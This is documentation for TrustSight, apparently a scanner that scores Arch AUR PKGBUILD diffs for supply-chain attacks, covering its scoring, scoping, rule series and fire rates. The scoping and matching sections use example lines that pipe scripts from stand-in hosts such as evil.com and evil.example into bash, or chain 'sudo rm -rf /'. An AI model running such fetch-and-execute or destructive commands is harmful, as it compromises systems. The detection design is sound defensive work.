<!-- description: How the rule engine works: the fields a rule carries, how severity becomes weight, what each series prefix means, and which identifiers are reserved. -->

# Rule System Reference

How the rule engine works: the fields a rule
carries, how severity becomes weight, what the series prefixes mean, and
which identifiers are reserved. Individual rule definitions live on the
[category pages](index.md); every rule id below links to its own.

TrustSight uses rules to detect structural signals in PKGBUILD diffs. Each rule contributes to the final score based on its severity weight, match target, and scope.

## How scoring uses rules

The final score is computed from four signal sources. Rules are the primary source (Tier A):

**Score formula:**

```text
base = sum(severity_weight for each fired rule)
base += source_bucket_modifiers (Tier B)
base += novelty_weights scaled by maturity (Tier C)
final = clamp(base, 0, 100)
```

If a FATAL rule fires, the score is immediately set to 100 regardless of all other signals.

### How severity weight maps to risk

Each severity level carries a weight that reflects its information value: how often does this signal fire on benign packages versus malicious ones?

| Severity | Weight | Fire rate on benign corpus | Meaning |
|----------|--------|---------------------------|---------|
| FATAL | 0 (hard-stop) | Never | Score immediately set to 100. Package is attempting to deceive the reviewer. |
| CRITICAL | 40 | Rare | Almost certainly malicious if triggered. curl pipe bash, sudo in functions. |
| HIGH | 25 | Low | Strong signal. Checksum manipulation, unexpected downloads. |
| MEDIUM | 15 | Moderate | Notable but not definitive. Install file changes. |
| LOW | 5 | High | Weak signal. Demoted from higher severity if corpus fire rate exceeds 30%. |
| INFO | 0 | Variable | Recorded for audit trail only. No score contribution. |

A CRITICAL rule on its own (weight 40) puts a package into the review queue under the default profile, whose threshold is 20. A single HIGH rule (weight 25) does the same, and so do two MEDIUM rules (15 + 15 = 30). The threshold is a *workload* choice rather than a property of the score: [`[review] profile`](../configuration.md#review) moves it to 40 (`quiet`) or 10 (`strict`) without changing any weight, band or arithmetic, and the report carries the profile and its effective threshold beside the `flagged` decision so a reader can see which queue produced it.

### How match_target selects what the rule sees

PKGBUILDs encode meaning at two levels. The text of the file declares structure (variables, arrays, function boundaries). The resolved values of those variables determine what actually runs. Rules target one or the other:

- **`resolved` target**: the rule pattern is applied to the post-variable-expansion value of each function body and source array. This catches patterns hidden behind variables: `curl $url | $shell` in the diff becomes `curl https://evil.com/hook.sh | bash` after resolution.
- **`raw_line` target**: the rule pattern is applied to the literal diff line with the `+`/`-` prefix stripped. This catches patterns in the PKGBUILD structure itself: a `sha256sums=('SKIP')` declaration or a unicode bidi override character.

Some patterns are only visible at the raw level (structure, declarations, unicode characters). Some are only meaningful after resolution (actual URLs, command strings). The two-target design covers both surfaces.

Both targets see *logical* lines, not physical ones. A shell continuation is joined before matching, so a command split across a trailing backslash is still matched as a whole:

```bash
curl \
  https://evil.example/x.sh | bash
```

Rules match one line at a time, so without this the pipe-to-shell patterns would see only `curl \`. Only lines carrying the same diff marker are joined, so an addition is never spliced onto a removal.

### How scope reduces false positives

Scope restricts which lines a `raw_line` rule checks. Without scope, a rule like H004 (`sudo`) would fire on every line containing the word `sudo`, including comments (`# sudo is required`), messages (`echo "sudo needed"`), and top-level declarations (`groups=('sudo')`). The `function_body` scope restricts matching to lines inside `build()`, `package()`, `check()`, and similar functions where commands actually execute.

Scope is set per-rule in `rules.toml`. When absent, the rule matches all lines. Scope has no effect on `resolved`-target rules because resolution already strips comments and top-level declarations.

The `message` context applies only when a line is *nothing but* a message. A shell line does not end at its first command, so `echo "x"; sudo rm -rf /` is an execution context, not a message, and `echo "$(curl evil | bash)"` runs a command substitution inside the quotes. Any command separator (`;`, `&`, `|`) or substitution (`$(`, backtick) after the message keyword disqualifies the line, which is what stops a short prefix from switching a scoped rule off.

A scope entry may also name the enclosing function rather than a generic context. This distinguishes cases that `function_body` alone cannot: `curl` inside `build()` is routine, while `curl` inside `pkgver()` reaches the network during version resolution, before any review step. R051 uses `scope = ["pkgver"]` for exactly this.

A named scope asks whether the code *runs* during that function, not whether it is written inside one, and those are different questions because the reviewed party chooses the function names:

```bash
_fetch() { curl -fsSL https://evil.example/x.sh -o "$srcdir/x.sh"; }
build()  { _fetch; bash "$srcdir/x.sh"; }
```

`_fetch` is not `build`, so keying on the enclosing name let a rename work as an evasion. Scope therefore follows the call graph: a line resolves to every function whose execution reaches it, transitively and through `$(...)`. The graph is built over the whole current PKGBUILD where the analysis has it, not only the diff hunk, so a helper added by one diff still connects to the `build()` that calls it from unchanged lines. `ScopeResolver` in `src/trustsight/rules.py` is the single implementation, shared by the config-driven `scope` field and by the rules in `analysis/build.py` and `analysis/delivery.py` that ask the same question in Python.

A finding names the indirection rather than claiming the wrong location: `_fetch(), called from build() downloads ...`, so the reader is sent to the line that holds the code.

Note that a *bare* function header (`build() {`) is classified as `other`, not `function_body`: the context applies to the lines *inside* the braces. A header that also carries code, though, is `function_body`, because that code really does run there: `build() { curl evil | bash; }` is matched by `function_body`-scoped rules, and the context does not leak to the lines that follow.

A pattern that matches the header while scoping itself to `function_body` therefore misses the ordinary multi-line form and only fires on single-line definitions; `trustsight lint-rules` reports this as `scope-contradiction`.

### How rules map to evidence tiers

| Tier | Rule sources | What they measure |
|------|-------------|-------------------|
| A (Structural) | R001-R059, R144, H001-H095, S001-S008, X001-X023, C001-C009, D001-D004 | Direct pattern matching against PKGBUILD commands and structure |
| B (Priors/Context) | Source bucket classification | Domain reputation of new URLs (not a rule, but a scoring input) |
| C (History/Novelty) | URL and maintainer novelty | First-seen signals from the local database |
| D (Verification) | Checksum, PGP, GPG presence | Declared integrity metadata, reported at weight 0 |
| Reported, not scored | W001-W006 | Analysis boundaries: bytes the package will run that this run could not read. Weight 0, always shown. |

Rules only contribute to Tier A. Tiers B and C are computed independently and added to the score alongside the rule contributions.

Tier D contributes nothing to the score. Declared verification is emitted as
weight-0 `P001`-`P008` findings and reported to the reader: TrustSight never
fetches, so it cannot confirm that a declared key signs anything, and a signal
an attacker can assert for free must not be able to lower a score. See
[B10](../../security.md#b10-positive-evidence-is-reported-never-credited).

### Declared-practice findings (P001-P008) {#declared-practice}

The P namespace reports practices the recipe *declares*, not risks that were
found. The `P` prefix exists so a reader seeing `P0xx` in the output knows at
once that it is not a risk finding. Every one is INFO, weight 0, and checkable
by the reader against the file itself. Defined in `src/trustsight/scoring.py`;
rendered from `DECLARED_REASONS`.

| Id | Meaning |
|----|---------|
| `P001` | Checksums declared for all non-VCS sources (`sha256sums`) |
| `P002` | `validpgpkeys` declared |
| `P003` | A signature source accompanies a source, with PGP keys declared |
| `P005` | Source pinned to a full commit hash (`checksum_pinned`) |
| `P006` | Source pinned to a tag - the weaker pin, which `H033` exists to flag because a tag can be repointed |
| `P007` | Source hosted on a trusted forge over HTTPS (`trusted_forge` bucket) |
| `P008` | Source tracks a branch or unpinned ref, so upstream decides at build time what this compiles and runs |

`P004` is skipped, so the family has seven members rather than eight. Four of
them - `P002`, `P003`, `P005` and `P008` - render unprompted; the other three
render under `--verbose`. Stating every declared practice on every package
would bury the risk findings, which is the opposite of what the group is for,
so the default set is the ones a reader would find *surprising by their
absence* - plus `P008`, which is the one whose *presence* is the notable thing.
The set is `DECLARED_DEFAULT` in `src/trustsight/scoring.py`.

`P008` is the counterpart `P005`/`P006` never had. A recipe that pins says so;
one that tracks a branch produced no line at all, and "nothing" reads exactly
like "pinned" to anyone scanning the group. It is deliberately not a coverage
gap: the statement is true of every VCS package by design, and raising a gap
would put 20.1% of the locked benign corpus (653 of 3,739 diffs) into
Inconclusive, which buys alert fatigue rather than information. The band is
left alone and the reader is told what the recipe declares. The
rest render under `--verbose`. The P namespace contrasts with H033/H049/H059:
those fire when a practice is *changed*, these report when one is *present*.
No P finding can lower a score - B10.

---

## R-series and H-series (core detection rules) {#r-series}

Two namespaces, distinguished by mechanism rather than by subject. An
**R-series** rule is a regex defined in `~/.config/trustsight/rules.toml` and
loaded at runtime by `load_rules()` in `src/trustsight/rules.py`; you can read
it, retune it, or switch it off. An **H-series** rule is a heuristic emitted by
an analysis module because it needs diff context a single-line regex cannot
see - what changed, what it changed relative to, what the corpus has seen
before - and it has no entry in `rules.toml`.

The fields below describe an R-series rule. H-series rules carry the same
severity, category and weight vocabulary in their findings, but they are not
configured through this file.

Each rule supports these fields:

| Field | Type | Description |
|-------|------|-------------|
| `id` | `string` | Rule identifier. Every id in `rules.toml` is an `R` id: `R001`-`R003`, `R007`-`R008`, `R010`-`R013`, `R017`, `R039`-`R059` and `R144`. |
| `name` | `string` | Human-readable name. |
| `pattern` | `string` | Python regex applied to the match target. |
| `severity` | `string` | `FATAL`, `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, or `INFO`. |
| `category` | `string` | Semantic category (`network_execution`, `obfuscation`, `installer`, `privilege`, `network_usage`, `injection`, `unicode`, `integrity`). |
| `match_target` | `string` | `"resolved"` : apply to variable-resolved command strings after tokenization. `"raw_line"` : apply to raw diff lines after stripping the `+`/`-` prefix. |
| `scope` | `list[string]` | (Optional, `raw_line` only) Restrict matching to line contexts (`["function_body"]`, `["message"]`, `["other"]`) or to a named PKGBUILD function (`["pkgver"]`, `["package"]`, `["package_foo"]`). When absent, matches all lines. |
| `added_only` | `bool` | (Optional, `raw_line` only) Match only added (`+`) lines. Raw diff lines include removals, so without this a maintainer *deleting* a suspicious line raises the score. All `R039`+ rules set it. |
| `experimental` | `bool` | (Optional) Skip the rule unless `[rules] experimental = true` in `config.toml`. Used for rules whose false-positive rate has not been measured against the benign corpus. |
| `include_comments` | `bool` | (Optional) Also match comment lines, which are filtered out for every other rule. Only for rules whose target is the *reader* rather than the shell (R012, R013): a commented-out command does not run, but a comment is exactly where an injection or a hidden character lives. |

### R001 {#r001}

See [R001: Remote Script Execution](fetch-and-execution.md#r001).


### R002 {#r002}

See [R002: Wget Pipe to Shell](fetch-and-execution.md#r002).


### R003 {#r003}

See [R003: Base64 Decode and Execute](obfuscation.md#r003).


### H001 {#h001}

See [H001: Checksum Disabled](integrity.md#h001).


### H002 {#h002}

See [H002: Checksum Emptied](integrity.md#h002).


### H003 {#h003}

See [H003: Insecure Download Protocol](fetch-and-execution.md#h003).


### R007 {#r007}

See [R007: Install File Modification](install-and-persist.md#r007).


### R008 {#r008}

See [R008: Unexpected File Download](fetch-and-execution.md#r008).


### H004 {#h004}

See [H004: Privilege Escalation](fetch-and-execution.md#h004).


### R010 {#r010}

See [R010: Uses curl in PKGBUILD](fetch-and-execution.md#r010).


### R011 {#r011}

See [R011: Uses wget in PKGBUILD](fetch-and-execution.md#r011).


### R012 {#r012}

See [R012: Prompt Injection Detection](deception.md#r012).


### R013 {#r013}

See [R013: Unicode Bidi Override](deception.md#r013).


### H005 {#h005}

See [H005: validpgpkeys Added](integrity.md#h005).


### H006 {#h006}

See [H006: New Make/Opt/Check Dependency](naming-and-dependency.md#h006).


### R017 {#r017}

See [R017: Setuid/Setgid Permission](install-and-persist.md#r017).


### H007 {#h007}

See [H007: Symlink Redirect](staging-and-recon.md#h007).


### H008 {#h008}

See [H008: Suspicious Environment Variable](integrity.md#h008).


### H009 {#h009}

See [H009: Network connection attempt](fetch-and-execution.md#h009).


### H010 {#h010}

See [H010: Suspicious file write](staging-and-recon.md#h010).


### H011 {#h011}

See [H011: Sensitive binary execution](fetch-and-execution.md#h011).


### H012 {#h012}

See [H012: Strace detection attempt (TracerPid check)](deception.md#h012).


### H013 {#h013}

See [H013: Strace log truncated (possible flood evasion)](deception.md#h013).


### H014 {#h014}

See [H014: Eval or Exec Usage](obfuscation.md#h014).


### Severity weights

Configured in `config.toml` `[severity_weights]`:

| Severity | Weight |
|----------|--------|
| FATAL | 0 (hard-stop score at 100) |
| CRITICAL | 40 |
| HIGH | 25 |
| MEDIUM | 15 |
| LOW | 5 |
| INFO | 0 |

### FATAL rules {#fatal-rules}

R012 and R013 are shipped FATAL rules. H056 can also emit a FATAL finding when a current package fact matches an IOC whose confidence is `confirmed`; lower-confidence IOC matches use lower severities. FATAL findings contribute **0 weight** to the running total but immediately set `final_score = 100` and risk level `"Critical"`. No other rules are evaluated for weight contribution after a FATAL fires; the short-circuit is in `calculate_score()` at `src/trustsight/scoring.py`. R012 and R013 are the shipped rules protected from configuration removal or downgrade; H056's severity is derived from the signed/local indicator confidence tier.

---

## C-series (code, structural rules) {#c-series}

Generated by `_structural_findings()` in `src/trustsight/analysis/structural.py`. Not configurable via TOML. Fire based on structural comparisons between the diff and the post-diff state. Each one compares the *before* and *after* of the diff; a checksum that changed while the source stayed put, a URL swapped without a version bump; which a pattern matched against one line at a time cannot express. Comparisons use `_pkgver_changed_in_diff()` to detect `pkgver=` value changes.

`_structural_findings()` is shared by `analyze_package()` (live) and `scan_diff()` (offline replay), so the two pipelines cannot drift apart.

### C001 {#c001}

See [C001: Checksum Changed Without Source Change With Stable Version](integrity.md#c001).


### C002 {#c002}

See [C002: Checksum Updated With Version Bump](integrity.md#c002).


### C003 {#c003}

See [C003: Source URL Changed Without Version Bump](integrity.md#c003).



### C004 {#c004}

See [C004: Checksum Removed For Unchanged Source](integrity.md#c004).


### C008 {#c008}

See [C008: Unread Content Moved Under A Stable Version](integrity.md#c008).

### C009 {#c009}

See [C009: Unread Content Moved With The Version](integrity.md#c009).

### C005 {#c005}

See [C005: Binary Artifact From Untrusted Source](integrity.md#c005).


### C006 {#c006}

See [C006: Maintainer Change With New Source Domain](maintainer-and-metadata.md#c006).


### C007 {#c007}

See [C007: Command Substitution In Source Array](fetch-and-execution.md#c007).


---

## Expanded ruleset (R039+) {#expanded-ruleset}

These rules roughly double the pattern-based detection surface. They are **enabled by default**, having been calibrated against a 3246-diff stratified benign corpus: fourteen fire on zero benign diffs, and every remaining hit was inspected individually; all but one were true positives. Enabling them costs 0.5 percentage points of zero-rate and leaves p95 unchanged.

The `experimental` flag remains supported for future additions. A rule carrying `experimental = true` is skipped unless `config.toml` sets:

```toml
[rules]
experimental = true
```

Numbering jumps over `R015`, `R026`-`R038` to keep the core and expanded ranges readable. `H005` and `H006`-`H014` shipped as TOML rules and are documented above; `R015` and `R026`-`R038` are **reserved**: they are referenced by nothing in the shipped config and must not be assigned casually, because a maintainer rule that reuses an id already present in a user's `rules.toml` would silently change what the user's override means.

Every `raw_line` rule below sets `added_only = true`.

### R039 {#r039}

See [R039: Eval With Dynamic Content](obfuscation.md#r039).


### R040 {#r040}

See [R040: Shell -c With Dynamic Payload](obfuscation.md#r040).


### R041 {#r041}

See [R041: Shell Network Redirection](fetch-and-execution.md#r041).


### R042 {#r042}

See [R042: Download Then Execute](fetch-and-execution.md#r042).


### R043 {#r043}

See [R043: Base64 Blob Decode](obfuscation.md#r043).


### R044 {#r044}

See [R044: Interpreter One-Liner With Network](fetch-and-execution.md#r044).


### R045 {#r045}

See [R045: Binary Encoding Pipe](obfuscation.md#r045).


### R046 {#r046}

See [R046: Source URL Uses IP Address](fetch-and-execution.md#r046).


### R047 {#r047}

See [R047: Source URL Uses Non-Standard Port](fetch-and-execution.md#r047).


### R048 {#r048}

See [R048: Source URL On Free Registrar TLD](fetch-and-execution.md#r048).


### R049 {#r049}

See [R049: Compiler Plugin Or Loader Override](integrity.md#r049).


### R050 {#r050}

See [R050: Compiler Hardening Disabled](integrity.md#r050).


### R051 {#r051}

See [R051: Network Access In pkgver](fetch-and-execution.md#r051).


### R052 {#r052}

See [R052: Dotfile Written To User Profile](install-and-persist.md#r052).


### R053 {#r053}

See [R053: Setuid Or Setgid Bit Set In Package Root](install-and-persist.md#r053).


### R059 {#r059}

See [R059: Setuid Or Setgid Bit Set Outside Package Root](install-and-persist.md#r059).


### R054 {#r054}

See [R054: Persistence Unit Outside Package Root](install-and-persist.md#r054).


### R055 {#r055}

See [R055: Git Clone With Variable Branch](fetch-and-execution.md#r055).


### R056 {#r056}

See [R056: Download Then Source](fetch-and-execution.md#r056).


### R057 {#r057}

See [R057: TLS Verification Disabled](fetch-and-execution.md#r057).


### R058 {#r058}

See [R058: Write Outside Package Root](staging-and-recon.md#r058).


---

### H015 {#h015}

See [H015: Critical Build Function Modified](fetch-and-execution.md#h015).


### H016 {#h016}

See [H016: Hidden Network Fetch In Build](fetch-and-execution.md#h016).


---

## Measured fire rates {#experimental-fire-rates}

The detailed rows below were measured against the 3,739-diff benign corpus with a 209,909-name dependency corpus. They are per-rule hit counts from a single run and are not regenerated on each push. All D-series, H016-H019, and H035-H036 rules are **on by default**, as are the code-emitted rules H037-H079. These are **false-positive rates**: every hit is a benign package.

The numbers are enforced, not just recorded. `scripts/calibration_gates.py` replays the corpus against the *shipped* configuration in a temporary directory with a cold database, and fails the build if any scoring rule exceeds a 0.30 fire rate, if benign p95 reaches the malicious p5, if a weight-0 annotation starts scoring, or if a labelled attack fixture stops being detected. It runs on every push. Class C and Class D rules are absent from this table because they cannot fire on a stateless diff at all, which is itself one of the gates.

For a complete reference including the core and expanded rules, see [Fire Rates](../../explanation/fire-rates.md).

| Rule | Severity | Fires | Rate | Read |
|------|----------|-------|------|------|
| D004 | HIGH | 0 | 0.00 % | No false positive across the 2084 corpus diffs that declare `provides`/`replaces`. |
| H017 | HIGH | 4 | 0.12 % | Three are `mullvad-vpn-bin`, which sets a setuid bit and enables a unit from `post_install()`. The fourth is `claude-desktop-bin`, whose `_fix_sandbox()` helper - reached only by following the call graph - sets 4755 on the Electron sandbox binary. Real privileged behaviour in both, which is the point. |
| H018 | HIGH | 0 | 0.00 % | Zero, because it asks where the patch comes from rather than whether it is declared. The broad "not in `source=()`" form measured 2.13 %. |
| H019 | MEDIUM | 1 | 0.03 % | `transset-df`, a genuine https to http downgrade. |
| H020 | INFO | - | - | Not calibrated: fires on any recent update, which is inherently time-of-run dependent. |
| H021 | INFO | - | - | Not calibrated: fires on packages < 30 days old, which is a small and shifting set. |
| H022 | MEDIUM | - | - | Not calibrated: fires when the user's last analysis is > 1 year old, which varies per database. |
| H023 | INFO | - | - | Not calibrated: zero-weight metadata; context only. |
| H024 | HIGH | 1 | 0.03 % | Near-zero; matches the predicted rate. |
| H025 | HIGH/MED | 8 | 0.25 % | All HIGH (LD_ vars). No MEDIUM fires in corpus. |
| H026 | HIGH | - | TBD | Not corpus-measurable; requires live git history. |
| H027 | INFO | 515 | 15.87 % | INFO weight 0; not a scoring impact. |
| H029 | HIGH | 2/179 pkgs | 1.12 % | Measured via package-name scan with seeded DB. Fires on `dosbox-x` and `electron36`. |
| H030 | MEDIUM | 11 | 0.34 % | Measured with seeded DB (209,909-name seed). Well under the 30% gate. |
| D001 | HIGH | 5 | 0.15 % | Comfortably low for HIGH. All five are real package names that simply nothing else in the AUR depends on (`kde-rounded-corners-x11`, `python2-gevent-eventemitter`, `udfclient-fuse3`), not parser noise. |
| D002 | HIGH | 0 | 0.00 % | No false positive anywhere in the corpus. Bounded by D001, which it refines. |
| D003 | MEDIUM | 15 | 0.46 % | Almost all are `git` added to fetch submodules, the legitimate case the MEDIUM severity anticipates. |
| H015 | INFO | 694 | **21.4 %** | Why it is INFO. No narrowing reaches triage quality (`pkgver` unchanged still leaves 11.6 %, a bump that also edits `build()` is 9.8 %), so it carries weight 0 and reports context instead of scoring. Harmless at that weight, hence on by default. |
| H016 | HIGH | 7 | 0.22 % | The hits are real build-time downloads (`apple-fonts`, `ttf-ms-win-*`, `gamescope-nvidia`), which is the behaviour the rule exists to surface rather than noise. |
| H031 | MEDIUM | 0 | 0.00 % | Needs both an unsafe literal version and its interpolation into a source URL. |
| H032 | HIGH | 1 | 0.03 % | A legitimate `$HOME/.config/...log` write from a `post_upgrade`. |
| H033 | HIGH/MED | 4 | 0.12 % | Maintainers tracking a moving patch branch under a fixed version, which is the shape the rule describes. |
| H034 | MEDIUM | 6 | 0.18 % | Schemes outside the shipped allowlist. |
| H038 | HIGH | 0 | 0.00 % | `mktemp -d` is excluded wholesale, so private scratch directories never count. |
| H041 | HIGH | 0 | 0.00 % | The one paste-host reference in the corpus is a gist download, which is H016's. |
| H039 | HIGH | 0 | 0.00 % | Reads the unit's `ExecStart`, not its filename. |
| H040 | INFO | 0 | 0.00 % | `env` was dropped after a `sed` expression read as a command position. |
| H042 | HIGH | 0 | 0.00 % | Deliberately the quietest of the persistence group. |
| H043 | INFO | 0 | 0.00 % | A benign diff with one or two hits cannot reach three distinct stages. |
| H056 | tiered | 0 | 0.00 % | With the shipped (empty) list and with a synthetic one. A positive control (`github.com`) fires on 1561 diffs, so the surface extraction is real. |
| H062 | MEDIUM | 4 | 0.12 % | Packages that legitimately ship pacman hooks. |
| H063 | MEDIUM | 0 | 0.00 % | An unchanged epoch never surfaces in a hunk. |
| H064 | HIGH/MED | 0 | 0.00 % | Related name shapes suppress; cold start cannot fire. |
| H065 | INFO | 0 | 0.00 % | Weight 0. Anchoring the check on an ANSI-C quote opener removed four regex end-anchor false positives. |
| H067 | HIGH | 0 | 0.00 % | Architecture checks are not probes. |
| H068 | HIGH | 0 | 0.00 % | A type check on decoded bytes, so encodings do not need enumerating. |
| H069 | HIGH | 0 | 0.00 % | Heredoc bodies are excluded from command scanning. |
| H071 | HIGH | 0 | 0.00 % | Command-position anchored; a client in `makedepends` is a declaration. |
| H072 | HIGH | 0 | 0.00 % | Still zero after the execution match was widened to a path with arguments. |
| H076 | HIGH | 0 | 0.00 % | A representative backdoor fixture goes from 25 to 50 with it. |
| H077 | HIGH | 3 | 0.09 % | One package resolving a redirect with `curl` at the top level, which really does fetch on a metadata refresh. |
| H078 | HIGH/MED/INFO | 6 | 0.18 % | Two introductions and four upstream key rotations. |
| H079 | HIGH/MED | 3 | 0.09 % | One wine package that genuinely disables FORTIFY_SOURCE. |

Getting D001 from 5.95 % to 0.15 % took two extractor fixes, both found by this measurement rather than by review:

- An unbounded fallback for unquoted array entries read shell fragments (`if`, `[[`, `!`) out of a `package()` body as dependency names.
- Comments inside dependency arrays contributed every word of the note (`required`, `because`, `disabled`).

Both are covered by regression tests in `tests/test_deps_rules.py`.

### H017 {#h017}

See [H017: Install Hook Fetches Or Executes](install-and-persist.md#h017).


### H018 {#h018}

See [H018: Patch Applied From Outside The Build Tree](integrity.md#h018).


### H019 {#h019}

See [H019: Source URL Downgraded To HTTP](integrity.md#h019).


---

## Temporal context rules (H020-H022) {#temporal-rules}

Defined in `src/trustsight/analysis/temporal.py`. They inspect git commit timestamps on
the AUR repository to surface temporal signals. None require a diff, so they
also fire on first-seen packages in `_make_fresh_analysis()` (in `pipeline.py`).

All three are **on by default** with no config toggle.

### H020 {#h020}

See [H020: Very Recent Update](temporal.md#h020).


### H021 {#h021}

See [H021: Brand New Package](temporal.md#h021).


### H022 {#h022}

See [H022: Stale Package Revived](temporal.md#h022).


---

## Install and build context rules (H023-H025) {#install-build-rules}

Defined in `src/trustsight/analysis/build.py` and `src/trustsight/analysis/pipeline.py`. They
inspect the diff for changes to security-critical build and install
infrastructure - hooks that run as root, signature verification that gets
dropped, environment variables that subvert the compiler.

### H023 {#h023}

See [H023: Install Hook Present](install-and-persist.md#h023).


### H024 {#h024}

See [H024: GPG Verification Removed](integrity.md#h024).


### H025 {#h025}

See [H025: Build Environment Subversion](integrity.md#h025).


---

## Maintainer and capability rules (H026-H027) {#maintainer-capability-rules}

### H026 {#h026}

See [H026: Untrusted Maintainer Takeover](maintainer-and-metadata.md#h026).


### H027 {#h027}

See [H027: Capability Density Anomaly](composition.md#h027).


---

## Temporal metadata (H028) - not a scored finding {#h028}

### H028 {#h028}

See [H028: Accelerated Release Cadence](corpus-behavioral.md#h028).


---

## Naming rule (H029) - package-name typosquat {#h029}

### H029 {#h029-rule}

See [H029: Package-Name Typosquat](naming-and-dependency.md#h029-rule).


---

## Dependency-set expansion rule (H030) {#h030}

### H030 {#h030-rule}

See [H030: Dependency-Set Expansion](count-based.md#h030-rule).


---

## Install and build context rules (H035-H036) {#h035-h036}

Defined in `src/trustsight/analysis/build.py`. They inspect install hooks and
build-function content for additional risk signals. Both are enabled by default,
and both fire on zero diffs of the benign corpus.

### H035 {#h035}

See [H035: Foreign Package Manager In Install Hook](install-and-persist.md#h035).


### H036 {#h036}

See [H036: Shell Obfuscation Density](count-based.md#h036).


---

## D-series dependency rules {#d-series}

Defined in `src/trustsight/analysis/dependencies.py`, not in `rules.toml`. They compare the
dependency arrays before and after the diff and consult the local database, so
they cannot be expressed as a pattern over a single line.

They also have to bypass the engine's own filtering: `rules.py` strips
`depends`, `makedepends`, `optdepends`, and `checkdepends` lines before any
pattern runs, which is why extraction lives in `src/trustsight/deps.py`.

All D-series rules are **enabled by default**. Disable them
individually under [`[experimental_rules]`](../configuration.md#experimental_rules).

### D001 {#d001}

See [D001: Novel Dependency Added](naming-and-dependency.md#d001).


### D002 {#d002}

See [D002: Typosquatted Dependency](naming-and-dependency.md#d002).


### D004 {#d004}

See [D004: Dependency Hijack Via Provides](naming-and-dependency.md#d004).


### D003 {#d003}

See [D003: New Network-Using Makedepends](naming-and-dependency.md#d003).



---

## Network-surface rules (H031, H033, H034, H041, H071, H077) {#network-surface-rules}

These six ask one question in different places: what does this recipe reach
over the network, in which direction, and when.

### H031 {#h031}

See [H031: Version-In-URL Injection](fetch-and-execution.md#h031).


### H033 {#h033}

See [H033: Moved Git Ref](integrity.md#h033).


### H034 {#h034}

See [H034: Exotic Source Protocol](fetch-and-execution.md#h034).


### H041 {#h041}

See [H041: Upload To Paste Or File-Drop Host](fetch-and-execution.md#h041).


### H071 {#h071}

See [H071: Covert Egress](fetch-and-execution.md#h071).


### H077 {#h077}

See [H077: Parse-time Network Fetch](fetch-and-execution.md#h077).


---

## Install-path persistence (H032, H038, H039, H042, H062, H076) {#persistence-rules}

One shared write-target resolver backs this group (`analysis/persistence.py`):
`install`/`cp`/`mv`/`ln` destinations including `-t DIR`, `>` redirects, and
the verb-substitution forms `tee`, `dd of=`, `mkdir -p`, `touch`, `rsync` and
`sed -i`. Every match is command-position anchored, so a quoted string such as
`'cp x ~/.zshrc'` never reads as a write.

### H032 {#h032}

See [H032: Write To User Home Or RC](install-and-persist.md#h032).


### H038 {#h038}

See [H038: World-Writable Staging](staging-and-recon.md#h038).


### H039 {#h039}

See [H039: Systemd ExecStart From Runtime-Writable Path](install-and-persist.md#h039).


### H042 {#h042}

See [H042: Hidden Drop](staging-and-recon.md#h042).


### H062 {#h062}

See [H062: Pacman Hook Installed](install-and-persist.md#h062).


### H076 {#h076}

See [H076: Build Writes Outside Staging Root](staging-and-recon.md#h076).


---

## Reconstruction and delivery (H065 to H072, H075, H080, H081 to H085) {#delivery-rules}

### H065 {#h065}

See [H065: Obfuscated Literal Reconstructed](obfuscation.md#h065).


### H080 {#h080}

See [H080: Indirect Command Expansion](obfuscation.md#h080).


---

### H066 {#h066}

See [H066: Embedded Binary In Tree](integrity.md#h066).


### H067 {#h067}

See [H067: Anti-Analysis Check](deception.md#h067).


### H068 {#h068}

See [H068: Reconstructed Executable Payload](fetch-and-execution.md#h068).


### H069 {#h069}

See [H069: Build-time Generation Then Execution](fetch-and-execution.md#h069).


### H070 {#h070}

See [H070: Archive Trailer Anomaly](integrity.md#h070).


### H072 {#h072}

See [H072: Write Then Execute](fetch-and-execution.md#h072).


### H075 {#h075}

See [H075: Indirect Remote Execution](fetch-and-execution.md#h075).


### H081 {#h081}

See [H081: Committed File Executed Without Declaration](fetch-and-execution.md#h081).


### H082 {#h082}

See [H082: Fetch Then Execute](fetch-and-execution.md#h082).


### H083 {#h083}

See [H083: Downloaded Source File Executed](fetch-and-execution.md#h083).


### H084 {#h084}

See [H084: Service ExecStart Targets Undeclared Binary](install-and-persist.md#h084).


### H085 {#h085}

See [H085: PATH Injection With Undeclared Directory](staging-and-recon.md#h085).


---

## Composition (H040, H043) {#composition-rules}

Both are annotations. Neither adds weight, so neither can turn an UNFLAGGED package
into a flagged one on its own.

### H040 {#h040}

See [H040: Host Reconnaissance](staging-and-recon.md#h040).


### H043 {#h043}

See [H043: Attack-Chain Composition](composition.md#h043).


---

## Integrity and trust (H078, H079) {#integrity-trust-rules}

### H078 {#h078}

See [H078: Signing Key Set Changed](integrity.md#h078).


### H079 {#h079}

See [H079: Build Flags Weakened](integrity.md#h079).


---

## Class B: declaration-scope rules (H063, H064) {#class-b-rules}

### H063 {#h063}

See [H063: Epoch Introduced](maintainer-and-metadata.md#h063).


### H064 {#h064}

See [H064: Provides/Replaces Scope Expansion](naming-and-dependency.md#h064).


---

## Class C: longitudinal rules (H037, H047 to H051, H054) {#class-c-rules}

Class C rules do not read a diff. They read `PropertyBreak` records from the
corpus property layer: a value that held for many consecutive observations and
then changed. Every one of them is silent on a cold database by construction,
because the first observation of a property only inserts it.

The `[longitudinal] stability_floor` (default 10) is the gate: a value must hold
at least that many consecutive observations before a change is reported at all.
Above the floor the weight ramps logistically, reaching roughly 0.9 by about 40
observations.

### H037 {#h037}

See [H037: Long-Stable Property Changed](maintainer-and-metadata.md#h037).


### H047 {#h047}

See [H047: Security-Relevant Build Flag Change](integrity.md#h047).


### H048 {#h048}

See [H048: Dependency Vendored Into Source](naming-and-dependency.md#h048).


### H049 {#h049}

See [H049: Source Host Changed](maintainer-and-metadata.md#h049).


### H050 {#h050}

See [H050: Version Scheme Changed](maintainer-and-metadata.md#h050).


### H051 {#h051}

See [H051: Package Description Changed](maintainer-and-metadata.md#h051).


### H054 {#h054}

See [H054: Build System Changed](maintainer-and-metadata.md#h054).


---

## Class D: corpus rules (H026, H044, H045, H046, H052, H053, H055, H057, H058, H059, H060, H061, H073, H074) {#class-d-rules}

Class D rules describe the corpus, not a package. They run once per metadata
cycle in `trustsight full-aur`, after the per-package loop, and each returns one
finding per **cluster**, with the members in `params.members`. They are silent
without a prior snapshot: the calibration gate is
`fire_rate(no_baseline) == 0`.

### H026 {#h026-corpus}

See [H026: Untrusted Maintainer Takeover (corpus path)](maintainer-and-metadata.md#h026-corpus).


### H044 {#h044}

See [H044: Ownership Transition](maintainer-and-metadata.md#h044).


### H045 {#h045}

See [H045: Mass Adoption](count-based.md#h045).


### H046 {#h046}

